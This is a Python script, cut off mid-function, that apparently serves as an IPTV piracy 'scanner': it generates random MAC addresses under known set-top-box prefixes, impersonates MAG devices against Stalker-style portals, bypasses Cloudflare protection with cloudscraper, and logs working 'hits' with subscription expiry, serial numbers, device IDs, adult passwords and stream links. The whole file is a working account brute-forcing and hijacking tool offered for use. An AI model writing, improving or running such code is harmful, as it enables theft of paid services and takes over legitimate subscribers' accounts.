# -*- coding: utf-8 -*-
# -*- update: 2_0_4_1 [2025.04.20] -*-
# -*- Ғɪx: ༺ ᶫˣ ༻ -*-

nickn="❓"

import os, sys, importlib

def set_title_name(title: str) -> None:
    if sys.platform.startswith('win'): import ctypes; ctypes.windll.kernel32.SetConsoleTitleW(title)
    else: sys.stdout.write(f'''\x1b]2;{title} \x07'''); sys.stdout.flush()

set_title_name(f"Piraci Premium Scaner by SirQaz")

packages = {
    "urllib3": "urllib3",
    "sock": ["requests[socks]", "sock", "socks", "PySocks"],
    "threading": "threading",
    "urllib": "urllib"
}

if os.name == 'nt' and sys.version_info > (3, 6, 7):
    packages["playsound"] = "playsound"
    packages["requests"] = "requests"
    packages["cloudscraper"] = "cloudscraper"
elif os.name != 'nt' and sys.version_info < (3, 6, 7):
    packages["cfscrape"] = "cfscrape"
    packages["requests"] = "requests==2.27.1"
    packages["cloudscraper"] = "cloudscraper==1.2.58"

for pkg, install_name in packages.items():
    try: globals()[pkg] = importlib.import_module(pkg)
    except ImportError:
        if isinstance(install_name, list):
            for name in install_name: os.system(f"{sys.executable} -m pip install {name}")
        else: os.system(f"{sys.executable} -m pip install {install_name}")
        globals()[pkg] = importlib.import_module(pkg)

import platform, datetime
import socket,hashlib,pathlib
import json, random, time, re
from datetime import date

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass 

os.system('cls' if os.name == 'nt' else 'clear')

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:ses= requests.Session()

import logging
logging.captureWarnings(True)

FRED = "\x1b[1;38;5;9m"
BLUE1 = "\x1b[38;5;36m"
GREEN1 = "\x1b[38;5;10m"
CYAN = "\x1b[38;5;14m"
MAGENTA = "\x1b[38;5;13m"
GRAY = "\x1b[38;5;102m"
GOLD = "\x1b[38;5;223m"
WHITE = "\x1b[38;5;1m"
YELLOW = "\x1b[38;5;11m"
FCYAN = "\x1b[1;38;5;14m"
FWHITE = "\x1b[1;38;5;1m"
FBLACK = "\x1b[1;38;5;0m"
FYELLOW = "\x1b[1;38;5;11m"
INVERT = "\x1b[1;7m"
RESET = "\x1b[0m"

yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
cpm=0

macSayisi=999999999999991# 1#deneme sayisÄ±
feyzo=(f"""{RESET}{YELLOW}      
             Pᴏʟsᴋɪ Sᴋᴀɴᴇʀ Iᴘᴛᴠ  
          🏴‍☠️ℙ𝕀ℝ𝔸ℂ𝕀 ℤ 𝕂𝔸ℝ𝔸𝕀𝔹ó𝕎🏴‍☠️              
        🏴‍☠️SɪʀQᴀᴢ Cᴏɴғɪɢ🏴‍☠️                  

          ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ           {RESET}           {FWHITE}""")
print(feyzo) 
kisacikti=""
#pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
ozelmac=""
#################
nick='@FeyzullahK'
bekleme=1
isimle=""
os.system('cls' if os.name == 'nt' else 'clear')
print(feyzo) 
nickn=input(f"""
 Wpisz swoją nazwę 
 Nazwa będzie widoczna w pliku z hitami
 
 jak nie wpiszesz żadnej 
 nazwy to nazwą będzie     {nickn}

Nazwa = """) or nickn
intro=f"""
{YELLOW}Domyślny panel: portal.php

     1 = portal.php
     2 = server/load.php
     3 = stalker_portal
     4 = portalstb/portal.php
     5 = k/portal.php(comet)
     6 = maglove/portal.php
     7 = XUI NXT /c/server/load.php
     8 = XUI NXT /c/portal.php
     9 = magportal/portal.php
    10 = powerfull/portal.php
    11 = magaccess/portal.php
    12 = ministra/portal.php
    13 = link ok/portal.php
    14 = delko/portal.php
    15 = delko/server/load.php
    16 = bStream/server/load.php
    17 = bStream/bs.mag.portal.php
    18 = blowportal.php
    19 = p/portal.php
    20 = client/portal.php
    21 = portalmega/portal.php
    22 = portalmega/portalmega.php
    23 = magload/magload.php
    24 = portal/c/portal.php
    25 = white/useragent/portal.php
    26 = white/config/portal.php
    27 = ultra/white/portal.php
    28 = realblue/server/load.php
    29 = realblue/portal.php
"""
intro=intro+f"""{RESET}
Wybierz panel. Zalecana opcja numer 8

Wpisz numer panelu = """
panel = input(intro)
print(RESET)
speed=""
uzmanm="portal.php"
useragent="okhttp/4.7.1"
if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"     	
if panel=="2":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
if panel=="3":
        uzmanm="stalker_portal/server/load.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"    	
if panel=="4":
        uzmanm="portalstb/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="5":
        uzmanm="k/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="6":
        uzmanm="maglove/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="7":
        uzmanm="c/server/load.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
if panel=="8":
        uzmanm="c/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"    
if panel=="9":
        uzmanm="magportal/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="10":
       uzmanm="powerfull/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"     	    
if panel=="11":
       uzmanm="magaccess/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"  
if panel=="12":
       uzmanm="ministra/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"     	
if panel=="13":
      uzmanm="Link_OK"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="14":
      uzmanm="delko/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="15":
      uzmanm="delko/server/load.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="16":
      uzmanm="bStream/server/load.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="17":
      uzmanm="bStream/bs.mag.portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="18":
      uzmanm="blowportal/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="19":
      uzmanm="p/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"  
if panel=="20":
      uzmanm="client/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
if panel=="21":
      uzmanm="portalmega/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="22":
      uzmanm="portalmega/portalmega.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"  
if panel=="23":
      uzmanm="magload/magload.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="24":
      uzmanm="portal/c/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
if panel=="25":
      uzmanm="portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"    	
if panel=="26":
      uzmanm="portal.php"
      uzmanc="portal"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="27":
      uzmanm="portal.php"
      uzmanc="ultra"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3"
if panel=="28":
      uzmanm="server/load.php"
      uzmanc="realblue"  	  	
realblue=""
if panel=="29":
	realblue="real"
print(RESET)	
print(panel)
kanalkata="0"

os.system('cls' if os.name == 'nt' else 'clear')

print(feyzo)

totLen="000000"
dosyaa=""
yeninesil=(
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:1B:79:',
'78:a3:52:',
'CC:97:AB:',
'AC:AE:19:',
'E4:7D:BD:',
'FC:03:9F:',
'B8:BC:5B:',
'00:2A:79:',
'90:0E:B3:',
'00:1A:79:',
)
dir = os.path.join('.', 'combo') if os.name == 'nt' else '/sdcard/combo/'
if not os.path.exists(dir): os.mkdir(dir)
if "1"=="1":
 	say=0
 	dsy=""
 	dir = os.path.join('.', 'combo') if os.name == 'nt' else '/sdcard/combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"=⫸ "+files+'\n'
 	print(f"""{RESET}
Wybierz plik z adresem panelu do skanowania
Pliki tekstowe z adresami paneli
muszą znajdować się w katalogu COMBO

"""+dsy+f"""{YELLOW}
Ilość plików w katalogu COMBO: """ +str(say)+"""
Wybierz numer pliku z listy""")
 	dsyno=str(input(f"{RESET}\nPlik numer = "))
 	say=0
 	if "1"=="1":#else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				pdosya=(dir+files)
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
	 				with open(pdosya, "r", encoding="utf-8") as f: erste_zeile = f.readline().strip()
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
	 				break
	 	say=0
	 	if not pdosya=="":
	 		print(pdosya)
	 	else:
	 		os.system('cls' if os.name == 'nt' else 'clear')
	 		print("Zły wybór pliku")
	 		quit()
	 	panelc=open(pdosya, 'r')
	 	paneltotLen=panelc.readlines()
	 	paneluz=(len(paneltotLen))

if "1"=="1":
 	dsyno="0"
 	say=0
 	
 	if dsyno=="0":
 		os.system('cls' if os.name == 'nt' else 'clear')
 		print(feyzo) 
 		nnesil=str(yeninesil)
 		nnesil=(nnesil.count(',')+1)
 		for xd in range(0,(nnesil)):
 			tire='  》'
 			if int(xd) <9:
 				tire='   》'
 			print(str(xd+1)+tire+yeninesil[xd])
 		mactur=input("\nWskaż wybrany typ MAC\n\nTyp numer = ")
 		if mactur=="":
 			mactur=20
 		#print(mactur)
 		mactur=yeninesil[int(mactur)-1]
 		print(mactur)
 		macuz=input("""
Wybierz ilość adresów MAC do przeskanowania

Przykład: 10000

Ilość = """)
 		if macuz=="":
 			macuz=1000000
 		macuz=int(macuz) 
 		print(macuz)
 	else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				dosyaa=(dir+files)
	 				break
	 	say=0
	 	if not dosyaa=="":
	 		print(dosyaa)
	 	else:
	 		os.system('cls' if os.name == 'nt' else 'clear')
	 		print("Wrong combo file selection!")
	 		quit()
	 	macc=open(dosyaa, 'r')
	 	mactotLen=macc.readlines()
	 	macuz=(len(mactotLen))
 	os.system('cls' if os.name == 'nt' else 'clear')
 	print(feyzo) 
 	baslama=""

 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama
botsay=0
botkac=5
 		
kanalkata="0"
kanalkata=input(f"""{FBLACK}
Wybór ilości informacji w pliku końcowym

    0 = Bez katalogów
    1 = Tylko kanały telewizyjne
    2 = Wszystko (LIVE, VOD I SERIALE)

{WHITE}Wpisz wybrany numer = """)
if kanalkata=="": kanalkata="0"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       
os.system('cls' if os.name == 'nt' else 'clear')

acount_id=""
a="0123456789ABCDEF"
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1
print(pdosya)
dosyaadi=str(input("""
Wpisz wybraną nazwę pliku koncowego

Nazwa pliku = """))
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
from urllib.parse import urlparse
sanitized_url = re.sub(r'[/.:]', '_', urlparse(erste_zeile).hostname)
if dosyaadi=="":dosyaadi=sanitized_url #"ᑭOᒪՏKI.ՏKᑌᖇᗯIᗴᒪ.Տᑕᗩᑎ" #"rapid.attack.scan"
hits = os.path.join('.', '') if os.name == 'nt' else '/sdcard/'
if not os.path.exists(hits):os.mkdir(hits)
Dosyab=hits+dosyaadi+f"@🏴‍☠️Pɪʀᴀᴄɪ🏴‍☠️_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
say=1
def yax(hits):
    dosya=open(Dosyab,'a+') 
    dosya.write(hits)
    dosya.close()	
     
def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

def tarih_clear(trh):
	#trh=tarih_exp
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	#print(ay)
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	#print(my_date)
	if 1==1:
		
		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		out=(int((sontrh-time.time())/86400))
		return out
	#except:pass
macs=""	
sayi=1

def randommac():
	try:
		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
		#print(genmac)
	except:pass
	genmac=genmac.replace(':100',':10')
	return genmac
	
def url1(panel):
	url="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
	return url

def url22(panel,macs):
	url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 

	if realblue=="real":
		url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url2
		
def url3(panel):
	url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 
	return url3

def url5(panel):
	url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
	return url5

def url6(panel):
	url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
	return url6

def liveurl(panel):
	liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
	return liveurl

def vodurl(panel):
	vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
	return vodurl

def seriesurl(panel):
	seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
	return seriesurl

def url(cid,panel):
	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
	return url7

def hea1(panel,macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return HEADERA

def hea2(macs,token,panel):
	tokens=token
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+tokens,
	}
	return HEADERd

def hea3(panel):
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea
hityaz=0
	
def hit(mac,trh,panel,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi,adult):
	global hitr
	global hityaz
	try:
		imzaT=str(mac)+"http://"+str(panel)+"/c/"
		imza="""
		
╭─➤ 🏴‍☠️🔹SɪʀQᴀᴢ🔺Cᴏɴғɪɢ🔹🏴‍☠️
│🔻ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ🔻
├◉ Mᴏᴅ1: SɪʀQᴀᴢ
├◉ Mᴏᴅ2: 𝐋𝐞𝐬𝐳𝐞𝐤𝟒𝟐𝟑𝟏 🇵🇱
├◉ Mᴏᴅ3: ༺ ᶫˣ ༻
├◉ 🌍 Rᴇᴀʟ ➤ """+str(real)+"""
├◉ 🌐 Pᴏʀᴛᴀʟ ➤ http://"""+str(panel)+"""/c/ """+str(playerapi)+"""
├◉ 🛰️ Tʏᴘ Pᴏʀᴛᴀʟᴜ ➤ """+uzmanm+"""
├◉ 🔢 Mᴀᴄ ➤ """+str(mac)+"""
├◉ 🗓️ Wʏɢᴀsᴀ ➤ """+str(trh)+"""
├◉ 🕓 Dᴀᴛᴀ Sᴋᴀɴᴜ ➤ """+str(time.strftime('%d-%m-%Y'))+"""/"""+str(time.strftime('%H:%M:%S'))+"""
╰─➤🎯 Aᴜᴛᴏʀ Sᴋᴀɴᴜ ➤ """+str(nickn)+"""

╭─➤ 🏴‍☠️🄳🄰🄽🄴🔹🄻🄸🅂🅃🅈🏴‍☠️
├◉ 🚦Wʏᴍᴀɢᴀɴʏ Vᴘɴ ➤ """+str(durum)+"""
├◉ 🌐 Vᴘɴ ➤ """+str(vpn)+"""
╰─➤ Iᴘᴛᴠ Zᴀᴘᴇᴡɴɪʟɪ  🏴‍☠️🔹Pɪʀᴀᴄɪ🔹🏴‍☠️

╭─➤ 🏴‍☠️🄱🄾🅇🔹🄸🄽🄵🄾🏴‍☠️
├◉ Aᴅᴜʟᴛ Pᴀssᴡᴏʀᴅ ➤ """+str(adult)+"""
├◉ 🔐 Sᴇʀɪᴀʟ ➤ """+str(SNENC)+""" 
├◉ 🔐 Sᴇʀɪᴀʟ Cᴜᴛ ➤ """+str(SNCUT)+"""
├◉ 🖥️1️⃣ Dᴇᴠɪᴄᴇ ID1 ➤ """+str(DEVENC)+"""
├◉ 🖥️2️⃣ Dᴇᴠɪᴄᴇ ID2 ➤ """+str(SINGENC)+"""
╰─➤ 🔻ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ🔻

╭─➤ 📂 Lɪɴᴋ ᴍ3ᴜ➤ """+str(m3ulink)+"""  
╰─➤ Iᴘᴛᴠ Zᴀᴘᴇᴡɴɪʟɪ 🏴‍☠️🔹Pɪʀᴀᴄɪ🔹🏴‍☠️ """
		if len(kanalsayisi) > 1:
			imza=imza+"""
╭─➤ 🏴‍☠️🄻🄸🅂🅃🄰🏴‍☠️
├▣ Tᴠ ➤ """+str(kanalsayisi)+"""
├▣ Vᴏᴅ ➤ """+str(filmsayisi)+"""
├▣ Sᴇʀɪᴀʟᴇ ➤ """+str(dizisayisi)+"""
╰─➤ 🏴‍☠️SɪʀQᴀᴢ🔺Cᴏɴғɪɢ🏴‍☠️"""
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+"""
╭─➤ 🏴‍☠️🄻🄸🅂🅃🄰🏴‍☠️
├▣ 🆃︎🆅︎ ➤
╰▣ """+str(livelist)+""" """
		if kanalkata=="2":
			imza=imza+"""
╭▣ 🆅🅾🅳 ➤
╰▣ """+str(vodlist)+"""
╭▣ 🆂🅴🆁🅸︎🅰︎🅻︎🅴︎ ➤
├▣ """+str(serieslist)+"""
╰─➤ 🔻ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ🔻"""

		yax(imza)
		yaxT(imzaT)
		hityaz=hityaz+1
		print(imza)
		if hityaz >= hitc:
			hitr=FYELLOW
	except:pass
cpm=0
cpmx=0
hitr=FYELLOW

def echok(mac,bot,total,hitc,oran,tokenr,panel):
	global cpm
	global status_code
	global hitr
	try:
		cpmx=(time.time()-cpm)
		cpmx=(round(60/cpmx))
		if str(cpmx)=="0":
			cpm=cpm
		else:
			cpm=cpmx
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added 
		echo=(f"""{RESET}
╭───➤ 🏴‍☠️🔹ᑭIᖇᗩᑕI🔹🏴‍☠️
├◉ {INVERT}PANEL➤ """+str(panel)+f"""  {RESET} 
├✠ {GRAY}STATUS➤ """ + status_code + f"""  {RESET} 
├─◈ {GOLD}MAC➤ """+tokenr+str(mac)+f"""  {BLUE1}CPM➤"""+str(cpm)+f"""  {RESET}
├──◉ {CYAN}TOTAL➤"""+str(total)+f""" {RESET} """+str(hitr)+"""HIT➤""" +str(hitc)+f"""  {FRED}%"""+str(oran)+f"""  {RESET}
╰───➤ 🔻ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ🔻 """)
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
		print(echo)
		cpm=time.time()
	except:pass
	
def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
		if not '404 page' in veri:
			vpnips=veri.split('"country_name":"')[1]
			vpnc=veri.split('"city":"')[1].split('"')[0]
			vpn=vpnips.split('"')[0]+' / ' + vpnc
		else:
			vpn="❌"
	except:
		vpn="❌"
	return vpn

def goruntu(link,panel):
	try:
		res = ses.get(link,  headers=hea3(panel), timeout=(2,5), allow_redirects=False,stream=True)
		duru="🅣︎🅐︎🅚︎🔒❗ "
		if res.status_code==302:
			 duru="Ⓝ︎Ⓘ︎Ⓔ︎ ✅😎 "
	except:
		duru="🅣︎🅐︎🅚︎🔒❗ "
	return duru

tokenr=RESET
def hitprint(mac,trh):
	sesdosya = os.path.join('.', 'iptv', "hit.mp3") if os.name == 'nt' else "/sdcard/iptv/hit.mp3"
	file = pathlib.Path(sesdosya)
	try:
		if file.exists(): ad.mediaPlay(sesdosya)
	except:pass
	print('     🎯 ℍ𝕀𝕋 𝔹𝕐 ℙ𝕀ℝ𝔸𝕋       \n  '+str(mac)+'\n  ' + str(trh))
	
def list(listlink,macs,token,livel,panel):
	kategori=""
	veri=""
	bag=0
	while True:
		try:
			res = ses.get(listlink,  headers=hea2(macs,token,panel), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break
			
	if veri.count('title":"')>1:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
	
	list=kategori
	return list
	
def m3uapi(playerlink,macs,token,panel):
	mt=""
	bag=0
	
	while True:
			try:
				res = ses.get(playerlink, headers=hea2(macs,token,panel), timeout=7, verify=False)
				veri=""
				veri=str(res.text)
				break
			except:
				time.sleep(1)
				bag=bag+1
				if bag==6:
					break
	try:
			acon=""
			if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				timezone=veri.split('timezone":"')[1]
				timezone=timezone.split('",')[0]
				timezone=timezone.replace("\/","/")
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
